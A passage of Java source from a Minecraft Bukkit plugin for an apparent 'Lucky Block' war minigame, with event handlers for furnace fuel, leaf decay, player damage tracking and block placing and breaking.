                                    if (event.getCurrentItem().getItemMeta().getDisplayName().equalsIgnoreCase(gray + "" + bold + "Lucky Fuel")) {
                                        event.setCancelled(true);
                                        return;
                                    }
                                }
                            }
                        }
                    }
                    if (event.getInventory().getType() == InventoryType.FURNACE) {
                        FurnaceInventory inv = (FurnaceInventory) event.getInventory();
                        if (inv.getItem(1) == null || (inv.getItem(1).getAmount() < 64)) {
                            inv.setItem(1, LuckyBlockAPI.createItemStack(Material.COAL, 64, (short) 0, gray + "" + bold + "Lucky Fuel"));
                            player.updateInventory();
                            final SchedulerTask task = new SchedulerTask();
                            task.setId(LuckyBlock.instance.getServer().getScheduler().scheduleSyncDelayedTask(LuckyBlock.instance, new Runnable() {
                                @Override
                                public void run() {
                                    player.updateInventory();
                                }
                            }, 1L));
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onLeafDecay(LeavesDecayEvent event) {
        for (War w : War.listWars) {
            if (w.getWorld().equalsIgnoreCase(event.getBlock().getWorld().getName())) {
                if (w.inGame() == false) {
                    if (w.getPlayers().size() > 0) {
                        event.setCancelled(true);
                    }
                }
            }
        }
    }

    @EventHandler
    private void onDamageEntity(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player) {
            Player player = (Player) event.getDamager();
            UUID uuid = player.getUniqueId();
            if (War.containPlayer(uuid)) {
                if (event.isCancelled() == false) {
                    double damage = event.getDamage();
                    if (!LuckyBlockAPI.totalDamage.containsKey(uuid)) {
                        LuckyBlockAPI.totalDamage.put(uuid, 0l);
                    }
                    LuckyBlockAPI.totalDamage.put(uuid, (long) (LuckyBlockAPI.totalDamage.get(uuid) + damage));
                    LuckyBlockAPI.saveConfigs();
                }
            }
        }
    }

    @EventHandler
    private void onBuildBlock(BlockPlaceEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        War war = null;
        for (int x = 0; x < War.listWars.size(); x++) {
            if (War.listWars.get(x).containsPlayer(uuid)) {
                war = War.listWars.get(x);
            }
        }
        if (war != null) {
            Player player = event.getPlayer();
            if (war.inGame() == true) {
                BlockPlaceInGameEvent e = new BlockPlaceInGameEvent(event.getBlock(), player, war);
                Bukkit.getServer().getPluginManager().callEvent(e);
            } else {
                if (player.isOp() == false) {
                    event.setCancelled(true);
                }
            }
        }
    }

    @EventHandler
    private void onBreakBlock(BlockBreakEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        if (War.getGame(uuid) != null) {
            War war = War.getGame(uuid);
            if (war.inGame() == true) {
                BlockBreakInGameEvent e = new BlockBreakInGameEvent(event.getBlock(), player, war);
                Bukkit.getServer().getPluginManager().callEvent(e);
            } else {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    private void onBreakBlockInGame(BlockBreakInGameEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        if (!LuckyBlockAPI.breakBlocks.containsKey(uuid)) {
            LuckyBlockAPI.breakBlocks.put(uuid, 0);
        }
        LuckyBlockAPI.breakBlocks.put(uuid, LuckyBlockAPI.breakBlocks.get(uuid) + 1);
        LuckyBlockAPI.savePlayerData(uuid, event.getPlayer().getName());
    }

    @EventHandler
    private void onPlaceBlockInGame(BlockPlaceInGameEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        if (!LuckyBlockAPI.buildBlocks.containsKey(uuid)) {
            LuckyBlockAPI.buildBlocks.put(uuid, 0);
        }
        LuckyBlockAPI.buildBlocks.put(uuid, LuckyBlockAPI.buildBlocks.get(uuid) + 1);
        LuckyBlockAPI.savePlayerData(uuid, event.getPlayer().getName());
    }

    @EventHandler
    private void onUseHerobrineItem(PlayerInteractEvent event) {
        if (event.getAction() == Action.RIGHT_CLICK_BLOCK || event.getAction() == Action.RIGHT_CLICK_AIR) {
            Player player = event.getPlayer();
            if (event.getItem() != null) {
                ItemStack item = event.getItem();
                if (item.hasItemMeta() && item.getItemMeta().hasDisplayName()) {

                }
            }
        }
    }


}
